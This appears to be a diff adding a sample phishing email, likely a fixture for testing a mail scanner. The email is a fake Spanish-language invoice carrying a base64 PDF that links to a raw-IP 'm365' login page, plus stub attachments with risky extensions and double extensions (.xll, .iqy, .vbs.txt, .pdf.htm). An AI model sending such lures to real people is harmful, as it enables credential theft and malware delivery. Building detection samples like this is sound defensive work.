@@ -1,0 +1,46 @@
+Authentication-Results: mx.google.com; dkim=pass header.i=@facturas-pa.top; spf=pass smtp.mailfrom=facturas-pa.top; dmarc=pass header.from=facturas-pa.top
+From: Facturación <f@facturas-pa.top>
+To: maria@ferreteria-pacifico.com.pa
+Subject: Factura electrónica
+Date: Wed, 7 Oct 2026 09:00:00 -0500
+Message-ID: <13216@facturas-pa.top>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b1"
+
+--b1
+Content-Type: text/plain
+
+Adjunto factura.
+
+--b1
+Content-Type: application/pdf; name="Factura_8812.pdf"
+Content-Disposition: attachment; filename="Factura_8812.pdf"
+Content-Transfer-Encoding: base64
+
+JVBERi0xLjQKMSAwIG9iajw8L1R5cGUvQW5ub3QvU3VidHlwZS9MaW5rL0E8PC9TL1VSSS9VUkkoaHR0cDovLzE4NS4xMi40LjQvbTM2NS9sb2dpbi5waHApPj4+PmVuZG9iagolJUVPRgo=
+--b1
+Content-Type: application/octet-stream; name="a.xll"
+Content-Disposition: attachment; filename="Reporte.xll"
+
+x
+--b1
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="consulta.iqy"
+
+x
+--b1
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="pago.vbs.txt"
+
+x
+--b1
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="pedido.pdf.htm"
+
+x
+--b1
+Content-Type: application/octet-stream
+Content-Disposition: attachment; filename="doc.svgz"
+
+x
+--b1--
